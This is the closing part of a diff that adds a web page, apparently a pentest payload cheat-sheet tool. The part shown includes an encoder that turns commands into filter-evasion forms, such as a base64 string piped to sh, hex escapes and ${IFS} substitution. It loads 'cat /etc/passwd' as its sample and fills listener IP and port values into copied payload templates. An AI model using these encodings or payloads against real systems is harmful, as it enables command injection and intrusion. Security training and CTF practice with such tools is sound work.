+        currentCategory = btn.getAttribute('data-category');
+        renderCards();
+      });
+    });
+
+    function resetFilters() {
+      currentCategory = 'all';
+      searchQuery = '';
+      searchInput.value = '';
+      clearSearchBtn.classList.add('hidden');
+
+      categoryChips.forEach((b, idx) => {
+        if (idx === 0) {
+          b.classList.add('active', 'border-primary/50', 'bg-primary/20', 'text-primary');
+          b.classList.remove('border-border-hairline', 'bg-surface-raised', 'text-on-surface-variant');
+        } else {
+          b.classList.remove('active', 'border-primary/50', 'bg-primary/20', 'text-primary');
+          b.classList.add('border-border-hairline', 'bg-surface-raised', 'text-on-surface-variant');
+        }
+      });
+
+      renderCards();
+    }
+
+    document.getElementById('reset-all-filters').addEventListener('click', resetFilters);
+
+    // =========================================================================
+    // 6. MULTI-FORMAT ENCODER SCRATCHPAD
+    // =========================================================================
+    const encInput = document.getElementById('encoder-input');
+    const encUrl = document.getElementById('enc-url');
+    const encDoubleUrl = document.getElementById('enc-double-url');
+    const encB64 = document.getElementById('enc-b64');
+    const encB64Sh = document.getElementById('enc-b64-sh');
+    const encHex = document.getElementById('enc-hex');
+    const encIfs = document.getElementById('enc-ifs');
+
+    function updateEncoderOutput() {
+      const val = encInput.value;
+      if (!val) {
+        encUrl.textContent = '';
+        encDoubleUrl.textContent = '';
+        encB64.textContent = '';
+        encB64Sh.textContent = '';
+        encHex.textContent = '';
+        encIfs.textContent = '';
+        return;
+      }
+
+      // 1. URL Encoded
+      const urlEnc = encodeURIComponent(val);
+      encUrl.textContent = urlEnc;
+
+      // 2. Double URL Encoded
+      encDoubleUrl.textContent = encodeURIComponent(urlEnc);
+
+      // 3. Base64
+      let b64 = '';
+      try {
+        b64 = btoa(val);
+      } catch(e) {
+        b64 = btoa(unescape(encodeURIComponent(val)));
+      }
+      encB64.textContent = b64;
+
+      // 4. Linux Base64 Pipe
+      encB64Sh.textContent = `echo ${b64} | base64 -d | sh`;
+
+      // 5. Hex Escape Sequence
+      let hex = '';
+      for (let i = 0; i < val.length; i++) {
+        const h = val.charCodeAt(i).toString(16).padStart(2, '0');
+        hex += '\\x' + h;
+      }
+      encHex.textContent = `$(echo -e "${hex}")`;
+
+      // 6. Space IFS
+      encIfs.textContent = val.replace(/\s+/g, '${IFS}');
+    }
+
+    encInput.addEventListener('input', updateEncoderOutput);
+
+    document.getElementById('load-sample-cmd').addEventListener('click', () => {
+      encInput.value = 'cat /etc/passwd';
+      updateEncoderOutput();
+      showToast('Loaded sample command');
+    });
+
+    document.querySelectorAll('.copy-tool-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const targetId = btn.getAttribute('data-target');
+        const targetEl = document.getElementById(targetId);
+        if (targetEl && targetEl.textContent) {
+          copyToClipboard(targetEl.textContent, 'Encoded format copied!');
+        }
+      });
+    });
+
+    document.querySelectorAll('.copy-raw-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const lhost = lhostInput.value.trim() || '10.10.14.23';
+        const lport = lportInput.value.trim() || '4444';
+        const text = btn.getAttribute('data-text')
+          .replace(/\[PORT\]/g, lport)
+          .replace(/\[IP\]/g, lhost);
+        copyToClipboard(text, 'Command copied!');
+      });
+    });
+
+    // =========================================================================
+    // 7. INITIALIZATION
+    // =========================================================================
+    document.getElementById('count-all').textContent = PAYLOADS.length;
+    renderCards();
+    updateEncoderOutput();
+  </script>
+
+  <!-- Site-wide Interactive Cyber Dock, Reading Progress Bar & Palette -->
+  <script src="portfolio-interactive.js"></script>
+</body>
+</html>
